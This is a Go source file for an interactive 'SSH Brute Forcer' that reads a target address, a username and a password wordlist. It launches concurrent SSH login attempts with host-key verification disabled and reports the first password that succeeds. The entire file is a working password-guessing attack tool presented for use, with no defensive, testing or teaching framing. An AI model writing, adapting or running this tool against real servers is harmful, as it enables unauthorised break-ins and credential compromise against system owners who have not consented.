package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func tryPassword(host, username, password string, wg *sync.WaitGroup, results chan<- string) {
	defer wg.Done()

	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         2 * time.Second,
	}

	conn, err := ssh.Dial("tcp", host, config)
	if err != nil {
		fmt.Printf("Connection failed! %v (Password: %s)\n", err, password)
		return
	}

	fmt.Printf("Connection Successful! (Password: %s)\n", password)
	conn.Close()
	results <- password
}
func clearConsole() {
	cmd := exec.Command("cmd", "/c", "cls")
	cmd.Stdout = os.Stdout
	cmd.Run()
}
func main() {
	clearConsole()

	asciiArt := `
	_______ __   __ _______  ______  _____  __   _ _____ ______ _______       
	|______   \_/   |       |_____/ |     | | \  |   |    ____/ |______ |     
	______|    |    |_____  |    \_ |_____| |  \_| __|__ /_____ |______ |_____
																			  
   `

	fmt.Println(asciiArt, "\n\n")

	animation := []string{"\\", "|", "/", "-"}
	for i := 0; i < 10; i++ {
		for _, frame := range animation {
			fmt.Printf("\rSSH Brute Forcer %s", frame)
			time.Sleep(100 * time.Millisecond)
		}
	}

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Input the Username: ")
	username, _ := reader.ReadString('\n')
	username = strings.TrimSpace(username)

	fmt.Print("Input the Target IP and Port (e.g., IP:PORT): ")
	host, _ := reader.ReadString('\n')
	host = strings.TrimSpace(host)

	fmt.Print("Input the Password text file path (e.g., C:/path/to/your/passwords.txt): ")
	filePath, _ := reader.ReadString('\n')
	filePath = strings.TrimSpace(filePath)

	file, err := os.Open(filePath)
	if err != nil {
		log.Fatalf("File not opened: %v", err)
	}
	defer file.Close()

	var wg sync.WaitGroup
	results := make(chan string, 1)
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		password := strings.TrimSpace(scanner.Text())
		wg.Add(1)
		go tryPassword(host, username, password, &wg, results)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	for result := range results {
		fmt.Printf("Password found: %s\n", result)
		return
	}

	if err := scanner.Err(); err != nil {
		log.Fatalf("Scanner error: %v", err)
	}

	fmt.Println("All passwords tried, connection failed.")
}
